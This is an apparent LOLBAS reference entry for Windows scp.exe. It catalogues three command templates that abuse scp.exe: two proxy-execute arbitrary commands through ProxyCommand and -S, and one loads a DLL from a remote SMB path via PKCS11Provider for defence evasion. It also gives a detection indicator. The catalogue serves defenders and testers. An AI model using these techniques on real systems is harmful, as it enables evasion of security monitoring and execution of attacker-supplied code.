---
title: "scp.exe"
source: lolbas-project.github.io
source_url: https://lolbas-project.github.io/lolbas/Binaries/Scp/
fetched_at: 2026-09-20T17:11:34Z
license: unspecified
category: windows
---

Used for uploading or downloading files over SSH.

## Paths
- C:\Windows\System32\OpenSSH\scp.exe

## Resources
- [https://gtfobins.org/gtfobins/scp/](https://gtfobins.org/gtfobins/scp/)
- [https://gist.github.com/screetsec/97d90750bfb058eb0b49c5374cdc0ac9](https://gist.github.com/screetsec/97d90750bfb058eb0b49c5374cdc0ac9)

## Acknowledgements
- BinFault ([@binfault](https://twitter.com/@binfault))
- Nir Chako (Pentera) ([@C_h4ck_0](https://twitter.com/@C_h4ck_0))
- Edo Maland ([@screetsec](https://twitter.com/@screetsec))

## Detections
- IOC: scp.exe executions referencing ProxyCommand.

## Execute

1. Spawns specified command from scp.exe -> ssh.exe, even if no SSH server is running on localhost (or any other address specified).

```
scp.exe -o ProxyCommand="{CMD}" . localhost:.
```

   - Use case: Proxy execution of specified command, can be used as a defensive evasion.

   - Privileges required: User

   - Operating systems: Windows 10, Windows 11

   - ATT&CK® technique: T1202

   - Tags: Execute: CMD

2. Spawns specified command from scp.exe -> ssh.exe, even if no SSH server is running on localhost (or any other address specified).

```
scp.exe -S "{CMD}" . localhost:.
```

   - Use case: Proxy execution of specified command, can be used as a defensive evasion.

   - Privileges required: User

   - Operating systems: Windows 10, Windows 11

   - ATT&CK® technique: T1202

   - Tags: Execute: CMD

3. Loads a DLL from an absolute path or SMB path into child process ssh.exe by abusing the PKCS11Provider option. The payload executes upon DLL load (DllMain) and requires exporting C_GetFunctionList to prevent premature termination by scp.exe.

```
scp -o PKCS11Provider="{PATH_SMB:.dll}" . win@github.com:.
```

   - Use case: Performs indirect execution of a specified DLL from a remote share, can be used for defense evasion.

   - Privileges required: User

   - Operating systems: Windows 10, Windows 11

   - ATT&CK® technique: T1218

   - Tags: Execute: DLLExecute: Remote
